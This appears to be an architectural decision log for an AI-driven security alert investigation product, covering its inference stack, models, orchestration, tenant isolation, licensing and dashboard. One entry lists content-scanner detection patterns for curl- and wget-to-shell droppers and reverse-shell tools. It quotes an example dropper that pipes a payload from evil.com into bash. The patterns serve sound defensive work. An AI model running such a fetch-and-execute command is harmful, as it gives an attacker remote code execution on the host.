# Zovark Architectural Decision Log

Every significant technical choice, why we made it, and what we said no to.

---

## llama-server instead of Ollama

**What we chose:** llama-server (llama.cpp compiled from source) running in a distroless container.

**Why:** Ollama's Python library (litellm) was compromised on PyPI in early 2026 — a supply chain attack injected credential-stealing code into a popular AI proxy package. For an air-gapped security product targeting defense/CMMC customers, we cannot depend on any package with a known supply chain incident. llama-server gives us a single binary with zero Python dependencies, OpenAI-compatible API, and GBNF grammar support for constrained JSON output.

**What we rejected:** Ollama (supply chain risk), vLLM (too heavy for edge deployment), text-generation-inference (CUDA-only, no CPU fallback).

**Impact:** We control the entire inference stack. No third-party AI proxy libraries. Direct HTTP POST to llama-server. Works air-gapped out of the box.

---

## Two-Model Architecture (FAST + CODE)

**What we chose:** Two logical LLM roles — FAST for quick decisions (tool selection, parameter filling) and CODE for deeper reasoning (verdict assessment, investigation summaries). On the dev tier, both roles point to the same model (Gemma 4 E4B). On customer tier, FAST gets a small fast model and CODE gets a larger reasoning model.

**Why:** Different pipeline stages have different quality vs. speed requirements. Tool selection needs to be fast (~5 seconds) but doesn't need deep reasoning. Verdict assessment needs careful analysis but can take longer. Separating the roles lets customers independently upgrade each one.

**What we rejected:** Single model for everything (too slow for tool selection), five specialized models (over-engineered, hard to maintain).

**Impact:** On a single GPU, both roles share the same model with dual semaphores preventing contention. On multi-GPU setups, each role gets its own container for true parallelism.

---

## Go API + Python Worker (not all Python)

**What we chose:** Go for the HTTP API layer, Python for the investigation pipeline worker.

**Why:** Go excels at high-concurrency HTTP handling — 162 routes, burst protection, SSE streaming, connection pooling all benefit from Go's goroutine model. Python excels at the investigation logic — regex extraction, data parsing, LLM integration, and the rich ecosystem of security analysis libraries. Temporal bridges them cleanly.

**What we rejected:** All-Python (FastAPI can't handle burst protection at scale), all-Go (reimplementing every security regex and ML tool in Go is impractical).

**Impact:** Two build steps (Go compile + Python container), but each service is optimized for its role.

---

## Temporal instead of Celery/Redis Queue

**What we chose:** Temporal for workflow orchestration — each investigation is a Temporal workflow with 6 activities (one per pipeline stage).

**Why:** Temporal gives us automatic retries with backoff, workflow state persistence (if the worker crashes mid-investigation, it resumes from the last completed stage), timeout enforcement per stage, and visibility into running workflows. Celery's retry semantics are weaker and don't preserve intermediate state.

**What we rejected:** Celery + Redis (no state persistence), raw Redis queues (no retry/timeout), Kafka (overkill for investigation orchestration).

**Impact:** If the worker container restarts, in-flight investigations resume automatically. Each stage has an independent timeout (30s for ingest, 15 minutes for analyze, 2 minutes for execute, etc.).

---

## Saved Plans Skip the LLM (Path A vs Path C)

**What we chose:** Pre-built investigation plans for the 24 known attack types. When an alert matches a known type, the pipeline loads the plan directly from a JSON file — no LLM call needed. Only novel/unknown alert types trigger LLM tool selection (Path C).

**Why:** Speed and determinism. Path A completes in ~5 milliseconds. Path C takes ~30 seconds (LLM inference). For the 95%+ of alerts that match known attack types, we get instant investigation with zero LLM dependency. The LLM is reserved for genuinely novel situations.

**What we rejected:** Always using the LLM (too slow, wastes GPU), never using the LLM (can't handle novel attacks).

**Impact:** Average investigation time is 2.6 seconds. Without saved plans, it would be 30+ seconds. The system can run on CPU-only hardware for known attack types.

---

## Entity Graph is Fire-and-Forget (Non-Fatal)

**What we chose:** Entity persistence (writing IOCs to the graph) happens in the Store stage and is wrapped in try/except. If it fails, the investigation verdict is still stored and returned normally.

**Why:** The entity graph is an intelligence enrichment layer, not a core pipeline requirement. A customer would rather have a fast, reliable verdict with no graph data than a crashed investigation because the graph write hit a constraint violation. The graph gets populated over time — one failed write doesn't matter.

**What we rejected:** Making entity persistence a hard requirement (would reduce pipeline reliability), running it as a separate async workflow (added complexity for marginal benefit).

**Impact:** Entity graph population is best-effort. The pipeline never crashes due to graph errors.

---

## Three-Layer Burst Protection

**What we chose:** Three independent layers before an alert reaches the Temporal workflow queue:
1. Redis dedup (exact hash match with severity-based TTL)
2. Batch buffer (group same-type + same-source alerts in 5-second windows)
3. Backpressure (queue depth monitoring with soft/hard limits)

**Why:** A SIEM can generate thousands of alerts per minute during a real attack. Without burst protection, each alert spawns a workflow that consumes GPU inference time. Three layers catch duplicates at different granularities: Layer 1 catches exact repeats, Layer 2 catches near-duplicates from the same source, Layer 3 prevents workflow queue overflow.

**What we rejected:** Single-layer dedup (misses batch attacks), no dedup (GPU would choke), application-level rate limiting (doesn't group related alerts).

**Impact:** A 5,000 same-IP brute force attack generates ~1 workflow per 5-second window instead of 5,000 workflows. GPU utilization stays manageable.

---

## Row-Level Security for Tenant Isolation

**What we chose:** PostgreSQL Row-Level Security (RLS) enabled on 10 tenant-scoped tables, plus explicit WHERE tenant_id clauses in every query (defense-in-depth).

**Why:** Zovark is multi-tenant — multiple customer organizations share the same database. RLS ensures that even if a developer forgets a WHERE clause, one tenant cannot see another tenant's data. The WHERE clauses are the primary defense; RLS is the safety net.

**What we rejected:** Separate databases per tenant (operational nightmare at scale), application-level-only isolation (one missed WHERE clause = data breach).

**Impact:** The zovark_app user (production) has FORCE ROW LEVEL SECURITY. The zovark user (owner) bypasses RLS for admin operations.

---

## Distroless Containers for Inference

**What we chose:** Google distroless container images for the LLM inference server — no shell, no package manager, no unnecessary binaries.

**Why:** The inference container handles the most sensitive operation (LLM processing of customer security data). Distroless containers have a minimal attack surface — even if an attacker achieves remote code execution, there's no shell to escalate with. This matters for CMMC and defense customers.

**What we rejected:** Alpine (has a shell and apk), Ubuntu (too large, too many binaries), scratch (no glibc for llama.cpp).

**Impact:** The inference container is ~50MB smaller and has no exec capability. Meets CMMC supply chain requirements.

---

## Gemma 4 E4B over Nemotron-Mini-4B

**Date:** 2026-04-05

**What we chose:** Google Gemma 4 E4B Q4_K_M (5GB) replaced NVIDIA Nemotron-Mini-4B (2.6GB).

**Why:** Better reasoning quality for verdict assessment. Gemma 4 produces more accurate risk scores and fewer false positives on our 100-alert benchmark. The ctx-size 4096 flag keeps memory usage manageable (2GB vs 7GB with default 128K context).

**What we rejected:** Keeping Nemotron (lower quality), upgrading to 8B+ (needs more VRAM than our 4GB minimum target).

**Impact:** Docker Desktop needs 12GB+ memory allocation. Model file kept for rollback.

---

## Fail-Closed License Enforcement

**Date:** 2026-04-07

**What we chose:** Any error during license verification results in DENY (no premium features). Ed25519 signature verification with 30-day grace period encoded in the signed payload (not configurable by the customer).

**Why:** License enforcement is a revenue protection mechanism. If the verification code has a bug, we'd rather deny premium features (safe, customer contacts support) than accidentally grant them (revenue leakage, hard to detect). The grace period is in the signed payload so customers can't extend it by changing a config file.

**What we rejected:** Fail-open (grants features on error — revenue risk), no grace period (too harsh for expired licenses), configurable grace period (customers would set it to 999 days).

**Impact:** Invariant #6 in the codebase — never changed, never bypassed.

---

## Copilot LLM Deprioritized Below Pipeline

**Date:** 2026-04-07

**What we chose:** The Copilot module (explain/suggest/correlate/brief) uses a dedicated Semaphore(1) carved from the CODE model's budget. Pipeline investigation calls always get priority over copilot queries.

**Why:** An analyst asking "explain this investigation" should never slow down an active investigation. The pipeline is the product — copilot is a convenience feature. If the GPU is busy with a Path C investigation, the copilot call waits or falls back to deterministic templates.

**What we rejected:** Shared semaphore (copilot could starve pipeline), separate GPU (too expensive for dev tier), no copilot (analysts need explanations).

**Impact:** Invariant #11. Pipeline throughput is never degraded by copilot usage.

---

## American-Only Model Provenance

**What we chose:** Only models from American companies (Google, NVIDIA, Meta) are used in production. All Chinese model references (Qwen/Alibaba) were removed.

**Why:** Target customers include US defense contractors (CMMC), healthcare (HIPAA), and government agencies. These organizations reject AI models with Chinese provenance due to supply chain security concerns and regulatory requirements.

**What we rejected:** Qwen 2.5 14B (better quality-per-parameter but Alibaba provenance), DeepSeek (Chinese), Mistral (French — acceptable but American preferred).

**Impact:** Model selection is constrained to Google, NVIDIA, and Meta model families. Currently using Gemma 4 E4B (Google).

---

## Broader Content Scanner Patterns After Path C Trace Analysis

**Date:** 2026-04-08

**What we chose:** Added 4 new content scanner patterns (`curl [flags] | bash`, `wget [flags] | bash`, `curl -o /tmp/`, `python -c 'import socket'`) and 3 signal boost patterns (`curl|bash`, `wget|bash`, `reverse.shell|meterpreter|cobalt.strike`). Content scanner now has 70 patterns, signal boost has 11.

**Why:** A detailed Path C code trace for a supply chain compromise alert revealed that the existing `curl\s+http.*| bash` pattern required `http` immediately after `curl`. Real-world droppers use `curl -s http://...` where the `-s` flag comes first, causing the pattern to miss the attack. The broader pattern `curl\s+[^\n]*\|\s*(?:ba)?sh` catches all flag combinations.

**What we rejected:** Only fixing the narrow pattern (would miss wget variants and python one-liners).

**Impact:** The content scanner now catches `curl -s http://evil.com/payload | bash` and similar dropper patterns that previously slipped through. Regression 16/16 confirmed.

---

## Dashboard Sidebar Navigation (Tab Bar to Grouped Sidebar)

**Date:** 2026-04-07

**What we chose:** Converted the web-admin dashboard (port 3100) from a flat 6-tab horizontal bar to a vertical sidebar with 4 collapsible groups: Operations, Intelligence, Analytics, Admin.

**Why:** The flat tab bar didn't scale as pages were added. The grouped sidebar provides hierarchical organization and room for future pages without cluttering the navigation.

**What we rejected:** Keeping the flat tabs (doesn't scale), mega-menu (over-engineered for 8 pages).

**Impact:** New Sidebar.tsx and AutoTemplates.tsx components added. AdminDashboard.tsx restructured to use sidebar layout. Pipeline Monitor available as a standalone page.
